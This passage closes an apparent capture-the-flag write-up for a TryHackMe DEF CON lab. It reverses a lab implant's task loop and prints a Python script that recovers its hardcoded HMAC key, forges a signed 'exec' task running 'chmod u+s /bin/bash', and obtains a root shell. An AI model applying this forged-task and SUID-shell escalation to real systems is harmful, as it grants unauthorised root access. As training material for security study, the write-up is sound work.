              if (iVar1 == 0) {
                iVar1 = strcmp(local_510,"exec");
                if (iVar1 == 0) {
                  system(local_508);
                }
                else {
                  strcmp(local_510,"sysinfo");
                }
                if (local_538 < local_4f0) {
                  local_538 = local_4f0;
                }
                free(local_520);
              }
              else {
                free(local_520);
              }
            }
            else {
              free(local_520);
            }
          }
        }
        local_530 = strtok_r((char *)0x0,"\n",&local_548);
      }
      free(local_528);
    }
    sleep(3);
  } while( true );
}
```

The core loop: after key setup, it repeatedly polls the socket for newline-separated, pipe-delimited tasks:

```text
ID|TYPE|COMMAND|ARGUMENT|HMAC
```

e.g. `15|exec|id|unused|<hmac>`. It rejects tasks with a stale/duplicate ID (anti-replay), recomputes the HMAC over `ID|TYPE|COMMAND|ARGUMENT` and compares it to the supplied signature, and if valid and `TYPE == exec`, passes the command straight to `system()`:

```c
if (strcmp(local_510,"exec") == 0) {
    system(local_508);
}
```

It then updates its last-processed task ID, sleeps 3 seconds, and repeats forever.

#### Putting It All Together

```text
Generate LCG Keystream
          │
          ▼
XOR with .rodata Constant
          │
          ▼
Derive HMAC Key
          │
          ▼
Connect to /run/evilinc/tasking.sock
          │
          ▼
Receive Task
(ID|TYPE|CMD|ARG|HMAC)
          │
          ▼
Verify HMAC-SHA256
          │
          ▼
Check Task ID
          │
          ▼
TYPE == exec ?
          │
          ▼
system(COMMAND)
          │
          ▼
Update Last Task ID
          │
          ▼
Sleep 3 Seconds
          │
          ▼
Repeat
```

Because the HMAC key derives entirely from hardcoded values and a deterministic PRNG, it's fully recoverable offline — and combined with write access to the tasking socket, that means arbitrary `exec` commands can be forged.

#### Forging a Valid Task and Escalating Privileges

```python
#!/usr/bin/env python3
import hashlib, hmac, os, socket, time

cipher = bytes.fromhex("1588c57c026ae5eb9c2d1817af48f70964efff765e58d112d8f116d70f9941b4")

def keystream(n, seed=0x1a2b3c4d):
    s = seed
    out = bytearray()
    for _ in range(n):
        s = (s * 0x41c64e6d + 0x3039) & 0xFFFFFFFF
        out.append((s >> 16) & 0xFF)
    return bytes(out)

blob = bytes(a ^ b for a, b in zip(keystream(len(cipher)), cipher))
machine_id = open("/etc/machine-id").read().strip()
signing_key = hmac.new(blob, machine_id.encode(), hashlib.sha256).digest()

task_id, task_type, cmd, nonce = "9999999", "exec", "chmod u+s /bin/bash", "1"
msg = f"{task_id}|{task_type}|{cmd}|{nonce}"
sig = hmac.new(signing_key, msg.encode(), hashlib.sha256).hexdigest()
submit = f"SUBMIT {msg}|{sig}"

sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
sock.connect("/run/evilinc/tasking.sock")
sock.send(submit.encode() + b"\n")
print(sock.recv(64).decode())

for _ in range(40):
    if os.stat("/bin/bash").st_mode & 0o4000:
        print("[+] /bin/bash is SUID root")
        break
    time.sleep(0.5)
else:
    print("[-] SUID bit never appeared")
```

This directly reimplements the reversed logic: `keystream()` mirrors `FUN_00101449()`, the XOR step mirrors `FUN_001014a2()`, `machine_id` mirrors `FUN_00101529()`, and the crafted `SUBMIT` message matches the format `FUN_00101a48()` expects, signed with the same HMAC process as `FUN_001016d7()`. Since every step matches the implant's own logic, it accepts the task as legitimate and runs `chmod u+s /bin/bash` via `system()`.

```shell
vanessa@tryhackme-2404:~$ python3 destruction.py
OK

[+] /bin/bash is SUID root
```

```shell
vanessa@tryhackme-2404:~$ /bin/bash -p
bash-5.2#
```

Root flag:

```shell
bash-5.2# cat /root/root.txt
EVILINC{REDACTED}
```

## Conclusion

Overflow The Jackpot was a fun, well-rounded DEF CON CTF that blended crypto, web exploitation, malware analysis, network forensics, reverse engineering, and privilege escalation into one storyline. What I enjoyed most was how each challenge rewarded understanding the underlying logic over blindly running tools — whether that meant spotting a weak repeating-key cipher, abusing a PHP stream wrapper to dodge a blacklist, pulling malware out of a packet capture, chaining a WordPress RCE, or reversing an implant to recover its own authentication scheme.

The final privilege escalation chain was the highlight: reverse engineering how the implant derived its signing key and processed tasks made it possible to forge valid signatures and turn the malware's own tasking mechanism against itself for root. A great reminder that small implementation mistakes in custom security controls can completely undermine their intended protection.

Big thanks to the TryHackMe team and challenge authors for a great DEF CON event — looking forward to the next one.
